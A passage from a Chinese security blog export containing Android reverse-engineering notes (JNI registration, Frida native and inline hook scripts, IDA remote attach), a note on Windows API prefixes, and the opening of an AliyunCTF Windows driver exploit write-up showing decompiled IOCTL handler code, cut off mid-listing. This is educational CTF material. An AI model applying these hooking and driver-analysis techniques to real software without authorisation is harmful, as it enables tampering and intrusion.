<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;jni.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span>  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> </span><br><span class="line"><span class="function">JNIEXPORT jstring JNICALL  </span></span><br><span class="line"><span class="function"><span class="title">Java_com_learn_native_1lib_MainActivity_stringFromJNI</span><span class="params">(  </span></span></span><br><span class="line"><span class="params"><span class="function">        JNIEnv* env,  </span></span></span><br><span class="line"><span class="params"><span class="function">        jobject <span class="comment">/* this */</span>)</span> </span>&#123;  </span><br><span class="line">    std::string hello = <span class="string">&quot;Hello from C++&quot;</span>;  </span><br><span class="line">    <span class="keyword">return</span> env-&gt;<span class="built_in">NewStringUTF</span>(hello.<span class="built_in">c_str</span>());  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>java层</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.learn.native_lib;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;  </span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.learn.native_lib.databinding.ActivityMainBinding;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// Used to load the &#x27;native_lib&#x27; library on application startup.  </span></span><br><span class="line">    <span class="keyword">static</span> &#123;  </span><br><span class="line">        System.loadLibrary(<span class="string">&quot;native_lib&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> ActivityMainBinding binding;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;  </span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);  </span><br><span class="line">  </span><br><span class="line">        binding = ActivityMainBinding.inflate(getLayoutInflater());  </span><br><span class="line">        setContentView(binding.getRoot());  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// Example of a call to a native method  </span></span><br><span class="line">        <span class="type">TextView</span> <span class="variable">tv</span> <span class="operator">=</span> binding.sampleText;  </span><br><span class="line">        tv.setText(stringFromJNI());  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/**  </span></span><br><span class="line"><span class="comment">     * A native method that is implemented by the &#x27;native_lib&#x27; native library,     </span></span><br><span class="line"><span class="comment">     * which is packaged with this application.     </span></span><br><span class="line"><span class="comment">     * */</span>    </span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">native</span> String <span class="title function_">stringFromJNI</span><span class="params">()</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>模拟器运行 + jadx反编译 + ida 打开so文件</p>
<h3 id="动态注册"><a href="#动态注册" class="headerlink" title="动态注册"></a>动态注册</h3><ol>
<li>函数名不用这么长，但是一般会与Java层的名称相同，方便开发</li>
<li>JNI_Onload 函数，动态注册</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> classname <span class="string">&quot;com/learn/native_demo/MainActivity&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> jclass myClass;</span><br><span class="line"></span><br><span class="line"><span class="function">jint <span class="title">JNI_OnLoad</span><span class="params">(JavaVM* vm, <span class="type">void</span>* reserved)</span> </span>&#123;</span><br><span class="line">	JNIEnv* env = <span class="literal">NULL</span>; </span><br><span class="line">    jint result = <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">//1. 从JavaVM获取JNIEnv，这里使用1.4的版本</span></span><br><span class="line">    <span class="keyword">if</span>(vm-&gt;<span class="built_in">GetEnv</span>((<span class="type">void</span> **) &amp;env, JNI_VERSION_1_4) != JNI_OK) &#123; </span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 2. 获取映射的java类</span></span><br><span class="line">    myClass = env-&gt;<span class="built_in">FindClass</span>(className);</span><br><span class="line">    <span class="keyword">if</span>(myClass == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;cannot get class:%s\n&quot;</span>, className);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 2. 通过RegisterNatives方法动态注册</span></span><br><span class="line">    <span class="keyword">if</span>(env-&gt;<span class="built_in">RegisterNatives</span>(myClass, gMethods, <span class="built_in">sizeof</span>(gMethods)/<span class="built_in">sizeof</span>(gMethods[<span class="number">0</span>])) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;register native method failed!\n&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> JNI_FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 4. 返回版本，否则加载会失败。</span></span><br><span class="line">    <span class="keyword">return</span> JNI_VERSION_1_4;                  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>动态注册，主要靠JNIEnv的RegisterNatives函数</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">jint <span class="title">RegisterNatives</span><span class="params">(jclass clazz, <span class="type">const</span> JNINativeMethod* methods,</span></span></span><br><span class="line"><span class="params"><span class="function">        jint nMethods)</span></span></span><br></pre></td></tr></table></figure>

<ol start="4">
<li>我们需要自定义 JNINativeMethod 数组</li>
</ol>
<ul>
<li><code>getNativeString</code>为Java类中定义的Native方法名。</li>
<li><code>()Ljava/lang/String;</code> 为方法的签名， <code>()</code>表示该方法无参数</li>
<li><code>reinterpret_cast&lt;void*&gt;(getString)</code> 为Native实现的方法名。这里强制转换成了函数指针。</li>
<li>这些函数都需要我们实现</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> JNINativeMethod gMethods[] = &#123;</span><br><span class="line">        &#123;<span class="string">&quot;getNativeString&quot;</span>, <span class="string">&quot;()Ljava/lang/String;&quot;</span>, <span class="built_in">reinterpret_cast</span>&lt;<span class="type">void</span>*&gt;(getString)&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>


<h2 id="smali-语法"><a href="#smali-语法" class="headerlink" title="smali 语法"></a>smali 语法</h2><p>Dalvik 虚拟机：Dalvik 是 Google 专门为 Android 平台设计的虚拟机。虽然 Android 程序可以使用 Java 语言来进行开发，但 Dalvik VM 和 Java VM 是两款不同的虚拟机。Dalvik VM 基于寄存器，而 Java VM 基于栈 。Dalvik VM 有专门的文件执行格式 dex (Dalvik Executable)，而 Java VM 则执行的是 Java 字节码。DVM 比 JVM 速度更快，占用的空间更少。</p>
<p>不必要死记硬背，使用时查表，用着就熟悉了</p>
<p><a href="https://ctf-wiki.org/android/basic_operating_mechanism/java_layer/smali/smali/">Smali - CTF Wiki (ctf-wiki.org)</a></p>
<h2 id="Firda"><a href="#Firda" class="headerlink" title="Firda"></a>Firda</h2><blockquote>
<p>只能说多看官方文档</p>
</blockquote>
<p>命令使用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 旧版 </span></span><br><span class="line">frida -U &lt;package_name&gt; -l hook.js  --no-pause</span><br><span class="line"><span class="comment"># 新版默认不会暂停，使用--pause 暂停 。</span></span><br><span class="line">frida-ps -Uai  // 获得名称</span><br><span class="line">frida -U  &lt;name&gt; -l hook.js </span><br></pre></td></tr></table></figure>

<p>某些方法</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取环境变量，就是获取 JNIEnv ，并且我们可以调用JNIEnv的方法</span></span><br><span class="line"><span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">getEnv</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 类型转化</span></span><br><span class="line"><span class="title function_">hexdump</span>()</span><br><span class="line"><span class="title function_">readCString</span>() </span><br><span class="line"><span class="title function_">toInt32</span>()</span><br></pre></td></tr></table></figure>

<h3 id="native-hook"><a href="#native-hook" class="headerlink" title="native hook"></a>native hook</h3><ol>
<li>获得so基址</li>
<li>获得函数基址，进行attach，两个方法，进入函数(onEnter)和退出函数(onLeave)的操作</li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> lib_name = <span class="string">&quot;xxx.so&quot;</span></span><br><span class="line">  <span class="keyword">let</span> func_offset = <span class="number">0x114514</span>;</span><br><span class="line">  <span class="keyword">let</span> libc_base = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(lib_name);</span><br><span class="line">  </span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;libc base: &quot;</span> + libc_base);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 一般so层函数第一个参数都是JniEnv，第二个参数是jclass</span></span><br><span class="line">  <span class="keyword">let</span> func_addr = libc_base.<span class="title function_">add</span>(func_offset);</span><br><span class="line">  <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(func_addr, &#123;</span><br><span class="line">    <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;start function&quot;</span>);</span><br><span class="line">      <span class="comment">// console.log(&quot;args[0] = \n&quot; + hexdump(args[0]));</span></span><br><span class="line">      <span class="comment">// console.log(&quot;args[1] = \n&quot; + hexdump(args[1]));</span></span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args[2] = \n&quot;</span> + <span class="title function_">hexdump</span>(args[<span class="number">2</span>]));</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args[3] = \n&quot;</span> + <span class="title function_">hexdump</span>(args[<span class="number">3</span>]));</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;function return&quot;</span>);</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;return =&gt; &quot;</span> + <span class="title function_">hexdump</span>(retval));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h3 id="inline-hook"><a href="#inline-hook" class="headerlink" title="inline hook"></a>inline hook</h3><blockquote>
<p>卡死的几率比较高</p>
</blockquote>
<ol>
<li>获得指令的地址</li>
<li>打印上下文 context</li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(addr, &#123;</span><br><span class="line">  <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;start function&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="variable language_">this</span>.<span class="property">context</span>))</span><br><span class="line">    <span class="comment">// 具体的寄存器值</span></span><br><span class="line">    conslole.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">context</span>.<span class="property">x0</span>)</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h2 id="IDA-Attach"><a href="#IDA-Attach" class="headerlink" title="IDA Attach"></a>IDA Attach</h2><blockquote>
<p>IDA yyds</p>
</blockquote>
<ol>
<li>手机启动 IDA Pro <code>dbgsrv</code> 中的 android_server(x86_64 或者 arm 根据机型选择)</li>
<li>端口转发</li>
<li>IDA Pro 顶栏 Debugger -&gt; Attach -&gt; Remote Android debugger</li>
</ol>
<p>需要端口转发才能attach，将android端口转发一下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb forward tcp:23946 tcp:23946</span><br></pre></td></tr></table></figure>


<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://developer.android.com/reference/android/os/Bundle">Bundle Android Developers</a></li>
<li><a href="https://frida.re/docs/home/">Frida • A world-class dynamic instrumentation toolkit</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/520523247?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTg3NDkwNTMsImZpbGVHVUlEIjoiZ1hxbWRWdmJPRXNYcG8zbyIsImlhdCI6MTY5ODc0ODc1MywiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjotODM1Mjk0Njk4M30.3D24gUz7Zah8RqqqLRzUIr5z1PlHm7nDF22mMsj6zBw">JNI动态注册、静态注册实例及其实现原理分析</a></li>
</ul>
]]></content>
      <categories>
        <category>REVERSE</category>
      </categories>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>Annoying-Windows-Prefix</title>
    <url>/2024/05/03/Annoying-Windows-Prefix/</url>
    <content><![CDATA[<h2 id="prefix"><a href="#prefix" class="headerlink" title="prefix"></a>prefix</h2><p><a href="https://stackoverflow.com/questions/66392277/what-is-the-significance-of-the-ki-and-ke-prefixes">windows - What is the significance of the Ki and Ke prefixes</a></p>
<p><a href="https://thehackerdev.com/windows-api-function-naming-convention/">Windows API Function Naming Convention</a></p>
<p><code>&lt;Prefix&gt;&lt;Operation&gt;&lt;Object&gt;</code>: NtCloseHandle</p>
<p>NT: new tech<br>Zw: 无意义，相对NT来说，少了一些检查，因此效率更高<br>Ldr: loader<br>Ki: Kernel Internal<br>Ke: kernel<br>Rtl: run time library<br>Psp: process support internal&#x2F;private</p>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/stg/coding-style-conventions">Coding Style Conventions - Win32 apps | Microsoft Learn</a></p>
<p>dw: DWORD<br>cb: Count of bytes<br>lp: LPVOID<br>f: flag<br>sz: string end with zero <code>\x00</code></p>
<p>BSOD： <strong>blue screen of death</strong></p>
]]></content>
      <categories>
        <category>CS</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>AliyunCTF SYSTEM</title>
    <url>/2024/04/25/AliyunCTF-SYSTEM/</url>
    <content><![CDATA[<blockquote>
<p>Windows Driver Exploit</p>
</blockquote>
<span id="more"></span>

<p>知识点蛮多的</p>
<h2 id="Driver"><a href="#Driver" class="headerlink" title="Driver"></a>Driver</h2><p>是个驱动，内容比较少，稍微看一下逻辑</p>
<p>驱动入口：DriverEntry，第一个函数是Windows给程序加了 <code>_security_cookie</code>，然后初始化DriverObject</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS __stdcall <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">sub_14000610C</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Init</span>(DriverObject);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>初始化DriverObject。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS __fastcall <span class="title">Init</span><span class="params">(PDRIVER_OBJECT DriverObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  NTSTATUS result; <span class="comment">// eax</span></span><br><span class="line">  NTSTATUS v3; <span class="comment">// ebx</span></span><br><span class="line">  _OWORD *DeviceExtension; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_UNICODE_STRING</span> DeviceName; <span class="comment">// [rsp+40h] [rbp-28h] BYREF</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_UNICODE_STRING</span> DestinationString; <span class="comment">// [rsp+50h] [rbp-18h] BYREF</span></span><br><span class="line">  PDEVICE_OBJECT DeviceObject; <span class="comment">// [rsp+80h] [rbp+18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  DeviceObject = <span class="number">0</span>i64;</span><br><span class="line">  <span class="built_in">RtlInitUnicodeString</span>(&amp;DeviceName, <span class="string">L&quot;\\Device\\SIOCTL&quot;</span>);</span><br><span class="line">  result = <span class="built_in">IoCreateDevice</span>(DriverObject, <span class="number">0x30</span>u, &amp;DeviceName, <span class="number">0x22</span>u, <span class="number">0x100</span>u, <span class="number">0</span>, &amp;DeviceObject);</span><br><span class="line">  <span class="keyword">if</span> ( result &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    DriverObject-&gt;MajorFunction[<span class="number">0</span>] = (PDRIVER_DISPATCH)DispatchCommon;</span><br><span class="line">    DriverObject-&gt;MajorFunction[<span class="number">2</span>] = (PDRIVER_DISPATCH)DispatchCommon;</span><br><span class="line">    DriverObject-&gt;MajorFunction[<span class="number">14</span>] = (PDRIVER_DISPATCH)DispatchControl;</span><br><span class="line">    DriverObject-&gt;DriverUnload = (PDRIVER_UNLOAD)Unload;</span><br><span class="line">    <span class="built_in">RtlInitUnicodeString</span>(&amp;DestinationString, <span class="string">L&quot;\\DosDevices\\IoctlTest&quot;</span>);</span><br><span class="line">    v3 = <span class="built_in">IoCreateSymbolicLink</span>(&amp;DestinationString, &amp;DeviceName);</span><br><span class="line">    DeviceExtension = DeviceObject-&gt;DeviceExtension;</span><br><span class="line">    *DeviceExtension = <span class="number">0</span>i64;</span><br><span class="line">    DeviceExtension[<span class="number">1</span>] = <span class="number">0</span>i64;</span><br><span class="line">    DeviceExtension[<span class="number">2</span>] = <span class="number">0</span>i64;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &lt; <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">IoDeleteDevice</span>(DeviceObject);</span><br><span class="line">    <span class="keyword">return</span> v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    _mm_lfence();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>DispatchCommon</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_CREATE                     0x00 </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_CLOSE                      0x02 </span></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">DispatchCommon</span><span class="params">(__int64 a1, IRP *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  a2-&gt;IoStatus.Status = <span class="number">0</span>;</span><br><span class="line">  a2-&gt;IoStatus.Information = <span class="number">0</span>i64;</span><br><span class="line">  <span class="built_in">IofCompleteRequest</span>(a2, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>我们可以控制的是size的大小，并且这个size大小为0x1000的倍数，向上取整</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_DEVICE_CONTROL           0x0e</span></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">DispatchControl</span><span class="params">(PDEVICE_OBJECT pDeviceObject, IRP *irp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_STACK_LOCATION</span> *CurrentStackLocation; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// ebx</span></span><br><span class="line">  PVOID DeviceExtension; <span class="comment">// rdi</span></span><br><span class="line">  ULONG ulInputBufferLength; <span class="comment">// r8d</span></span><br><span class="line">  ULONG ulOutputBufferLength; <span class="comment">// edx</span></span><br><span class="line">  ULONG ulIoControlCode; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">void</span> *__pStartAddr2; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_MDL</span> *__pMdl2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">void</span> *__pVirtualAddress; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_MDL</span> *__pMdl; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">char</span> *buffer; <span class="comment">// r13</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> _usSize; <span class="comment">// r15d</span></span><br><span class="line">  PVOID ContiguousMemory; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">void</span> *_pVirtualAddress; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_MDL</span> *Mdl; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_MDL</span> *_pMdl; <span class="comment">// r14</span></span><br><span class="line">  PVOID pStartAddr2; <span class="comment">// rax</span></span><br><span class="line">  PVOID _pStartAddr2; <span class="comment">// r12</span></span><br><span class="line">  _DWORD *SystemBuffer; <span class="comment">// r13</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> usSize; <span class="comment">// r15d</span></span><br><span class="line">  PVOID pVirtualAddress; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_MDL</span> *pMdl; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> pMapAddr; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> _pMapAddr; <span class="comment">// r12d</span></span><br><span class="line"></span><br><span class="line">  CurrentStackLocation = irp-&gt;Tail.Overlay.CurrentStackLocation;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  DeviceExtension = pDeviceObject-&gt;DeviceExtension;</span><br><span class="line">  ulInputBufferLength = CurrentStackLocation-&gt;Parameters.DeviceIoControl.InputBufferLength;</span><br><span class="line">  ulOutputBufferLength = CurrentStackLocation-&gt;Parameters.DeviceIoControl.OutputBufferLength;</span><br><span class="line">  <span class="keyword">if</span> ( !ulInputBufferLength || !ulOutputBufferLength )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="number">0xC000000D</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">  &#125;</span><br><span class="line">  ulIoControlCode = CurrentStackLocation-&gt;Parameters.DeviceIoControl.IoControlCode;</span><br><span class="line">  <span class="keyword">switch</span> ( ulIoControlCode )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x9C402400</span>:</span><br><span class="line">      <span class="keyword">if</span> ( ulInputBufferLength != <span class="number">4</span> || ulOutputBufferLength != <span class="number">8</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">      SystemBuffer = irp-&gt;AssociatedIrp.SystemBuffer;</span><br><span class="line">      usSize = (*SystemBuffer + <span class="number">0xFFF</span>) &amp; <span class="number">0xFFFFF000</span>;</span><br><span class="line">      pVirtualAddress = <span class="built_in">MmAllocateContiguousMemory</span>(usSize, (PHYSICAL_ADDRESS)<span class="number">0xFFFFFFFFFFFFFFFF</span>ui64);</span><br><span class="line">      _pVirtualAddress = pVirtualAddress;</span><br><span class="line">      <span class="keyword">if</span> ( pVirtualAddress )</span><br><span class="line">      &#123;</span><br><span class="line">        pMdl = <span class="built_in">IoAllocateMdl</span>(pVirtualAddress, usSize, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>i64);/</span><br><span class="line">        _pMdl = pMdl;</span><br><span class="line">        <span class="keyword">if</span> ( pMdl )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">MmBuildMdlForNonPagedPool</span>(pMdl); </span><br><span class="line">          pMapAddr = (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">MmMapLockedPagesSpecifyCache</span>(_pMdl, <span class="number">1</span>, MmNonCached, <span class="number">0</span>i64, <span class="number">0</span>, <span class="number">0x10</span>u);</span><br><span class="line">          _pMapAddr = pMapAddr;</span><br><span class="line">          <span class="keyword">if</span> ( pMapAddr )</span><br><span class="line">          &#123;</span><br><span class="line">            *(_QWORD *)DeviceExtension = pMapAddr;</span><br><span class="line">            *((_QWORD *)DeviceExtension + <span class="number">1</span>) = _pVirtualAddress;</span><br><span class="line">            *((_QWORD *)DeviceExtension + <span class="number">2</span>) = _pMdl;</span><br><span class="line">            <span class="built_in">Memset</span>(<span class="type">void</span> *)pMapAddr, <span class="number">0xFF</span>, usSize);</span><br><span class="line">            *SystemBuffer = usSize;             </span><br><span class="line">            SystemBuffer[<span class="number">1</span>] = _pMapAddr;        </span><br><span class="line">            irp-&gt;IoStatus.Information = <span class="number">8</span>i64;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">          &#125;</span><br><span class="line">LABEL_31:</span><br><span class="line">          <span class="built_in">IoFreeMdl</span>(_pMdl);</span><br><span class="line">        &#125;</span><br><span class="line">LABEL_29:</span><br><span class="line">        <span class="built_in">MmFreeContiguousMemory</span>(_pVirtualAddress);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0xC000009A</span>i64;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x9C402404</span>:</span><br><span class="line">      <span class="keyword">if</span> ( ulInputBufferLength != <span class="number">4</span> || ulOutputBufferLength != <span class="number">12</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">      buffer = (<span class="type">char</span> *)irp-&gt;AssociatedIrp.SystemBuffer;</span><br><span class="line">      _usSize = (*(_DWORD *)buffer + <span class="number">0xFFF</span>) &amp; <span class="number">0xFFFFF000</span>;</span><br><span class="line">      ContiguousMemory = <span class="built_in">MmAllocateContiguousMemory</span>(_usSize, (PHYSICAL_ADDRESS)<span class="number">0xFFFFFFFFFFFFFFFF</span>ui64);</span><br><span class="line">      _pVirtualAddress = ContiguousMemory;</span><br><span class="line">      <span class="keyword">if</span> ( ContiguousMemory )</span><br><span class="line">      &#123;</span><br><span class="line">        Mdl = <span class="built_in">IoAllocateMdl</span>(ContiguousMemory, _usSize, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>i64);</span><br><span class="line">        _pMdl = Mdl;</span><br><span class="line">        <span class="keyword">if</span> ( Mdl )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">MmBuildMdlForNonPagedPool</span>(Mdl);</span><br><span class="line">          pStartAddr2 = <span class="built_in">MmMapLockedPagesSpecifyCache</span>(_pMdl, <span class="number">1</span>, MmNonCached, <span class="number">0</span>i64, <span class="number">0</span>, <span class="number">0x10</span>u);</span><br><span class="line">          _pStartAddr2 = pStartAddr2;</span><br><span class="line">          <span class="keyword">if</span> ( pStartAddr2 )</span><br><span class="line">          &#123;</span><br><span class="line">            *((_QWORD *)DeviceExtension + <span class="number">4</span>) = _pVirtualAddress;</span><br><span class="line">            *((_QWORD *)DeviceExtension + <span class="number">3</span>) = pStartAddr2;</span><br><span class="line">            *((_QWORD *)DeviceExtension + <span class="number">5</span>) = _pMdl;</span><br><span class="line">            <span class="built_in">Memset</span>(pStartAddr2, <span class="number">0xFF</span>, _usSize);</span><br><span class="line">            *(_DWORD *)buffer = _usSize;</span><br><span class="line">            *(_QWORD *)(buffer + <span class="number">4</span>) = _pStartAddr2;</span><br><span class="line">            irp-&gt;IoStatus.Information = <span class="number">12</span>i64;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_29;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0xC000009A</span>i64;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x9C402408</span>:</span><br><span class="line">      <span class="keyword">if</span> ( !*(_QWORD *)DeviceExtension )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">      __pMdl = (<span class="keyword">struct</span> _MDL *)*((_QWORD *)DeviceExtension + <span class="number">2</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !__pMdl || !*((_QWORD *)DeviceExtension + <span class="number">1</span>) )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">      <span class="built_in">MmUnmapLockedPages</span>(*(PVOID *)DeviceExtension, __pMdl);</span><br><span class="line">      <span class="built_in">IoFreeMdl</span>(*((PMDL 